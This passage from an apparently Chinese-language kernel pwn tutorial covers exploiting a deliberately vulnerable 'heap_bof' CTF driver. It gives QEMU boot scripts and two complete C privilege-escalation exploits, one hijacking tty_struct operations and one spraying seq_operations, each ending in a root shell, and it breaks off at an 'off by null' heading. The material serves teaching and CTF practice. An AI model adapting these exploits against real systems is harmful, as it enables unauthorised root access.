<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  --nographic</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-10"><a href="#利用思路-10" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptmx_open (drivers/tty/pty.c)</span><br><span class="line">-&gt; tty_init_dev (drivers/tty/tty_io.c)</span><br><span class="line">  -&gt; alloc_tty_struct (drivers/tty/tty_io.c)</span><br></pre></td></tr></table></figure></div>

<p><code>tty</code> 的结构体 <code>tty_srtuct</code> 定义在 <code>linux/tty.h</code> 中。其中 <code>ops</code> 项（<code>64bit</code> 下位于 结构体偏移 <code>0x18</code> 处）指向一个存放 <code>tty</code> 相关操作函数的函数指针的结构体 <code>tty_operations</code> 。其魔数为<code>0x5401</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sizeof(struct tty_struct) == 0x2e0</span></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>tty</code> 设备的前提是挂载了 <code>ptmx</code> 设备。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts none /dev/pts</span><br><span class="line">chmod 777 /dev/ptmx</span><br></pre></td></tr></table></figure></div>

<p>所以我们只需要劫持 <code>tty_ops</code> 的某个可触发的操作即可，将其劫持到 <code>get_root</code> 函数处。</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xffffffff810a1340</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_rflags, user_rsp, user_ss, user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rbx, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rbx;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff814f604f</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;    <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;     <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        get_root</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// len buf idx</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x2e0</span>, <span class="built_in">malloc</span>(<span class="number">0x2e0</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]p_addr==&gt;%p\n&quot;</span>, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x2e0</span>;</span><br><span class="line">    ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    ioctl(bof_fd, BOF_FREE, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ptmx_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]magic_code==&gt; %p -- %p\n&quot;</span>, &amp;p.buf[<span class="number">0</span>], *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]tty____ops==&gt; %p -- %p\n&quot;</span>, &amp;p.buf[<span class="number">0x18</span>], *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0x18</span>]);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0x18</span>] = &amp;fake_tty_ops;</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line"></span><br><span class="line">    ioctl(ptmx_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="seq-operations-劫持"><a href="#seq-operations-劫持" class="headerlink" title="seq_operations 劫持"></a>seq_operations 劫持</h2><p><strong>boot.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  --nographic</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-11"><a href="#利用思路-11" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>seq_operations</code> 结构如下，该结构在打开 <code>/proc/self/stat</code> 时从 <code>kmalloc-32</code> 中分配。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>调用读取 <code>stat</code> 文件时会调用 <code>seq_operations</code> 的 <code>start</code> 函数指针。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> file-&gt;private_data;</span><br><span class="line">	...</span><br><span class="line">	p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>

<p>当我们在 <code>heap_bof</code> 驱动分配 <code>0x20</code> 大小的 <code>object</code> 后打开大量的 <code>stat</code> 文件就有很大概率在 <code>heap_bof</code> 分配的 <code>object</code> 的溢出范围内存在 <code>seq_operations</code> 结构体。由于这道题关闭了 <code>SMEP</code>，<code>SMAP</code> 和 <code>KPTI</code> 保护，因此我们可以覆盖 <code>start</code> 函数指针为用户空间的提权代码实现提权。至于 <code>KASLR</code> 可以通过泄露栈上的数据绕过。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240922171025707.png"
                      alt="image-20240922171025707"
                ></p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> SEQ_NUM = <span class="number">0x200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> DATA_SIZE = <span class="number">0x20</span> * <span class="number">8</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF810A1340</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rax, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81229378</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x20</span>, <span class="built_in">malloc</span>(<span class="number">0x20</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="string">&#x27;\xff&#x27;</span>, p.len);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open stat.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] seq_operations spray finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p.len = DATA_SIZE;</span><br><span class="line">    p.buf = <span class="built_in">malloc</span>(DATA_SIZE);</span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DATA_SIZE; i += <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) &#123;</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;p.buf[i] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Heap overflow finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        read(seq_fd[i], p.buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h2><p>现在我们假设这道题没有提供free，并且只有单字节溢出，并且溢出的单字节只能是<code>NULL</code>，那么我们应该怎麼去利用呢？</p>
<h3 id="利用思路-12"><a href="#利用思路-12" class="headerlink" title="利用思路"></a>利用思路</h3><p><strong>boot.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 1G \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=2 \</span><br><span class="line">  --nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>poll系统调用</strong></p>
